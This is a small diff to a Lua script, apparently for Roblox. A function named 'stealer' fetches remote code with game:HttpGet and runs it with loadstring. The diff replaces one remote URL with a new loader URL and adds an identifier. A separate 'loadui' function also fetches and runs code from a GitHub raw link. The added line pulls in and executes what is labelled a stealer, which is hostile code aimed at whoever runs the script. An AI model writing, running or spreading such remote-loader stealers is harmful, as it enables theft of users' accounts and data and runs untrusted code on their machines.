@@ -1,5 +1,6 @@
 local function stealer()
-    loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/TByGs4kFzIupEH8L/raw", true))()
+    ID="75ec1e45-7997-497f-915c-228c7cb61816";
+    loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
 end
 local function loadui()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/ShiraInuba01/maomaoscripts/refs/heads/main/final.txt"))() 
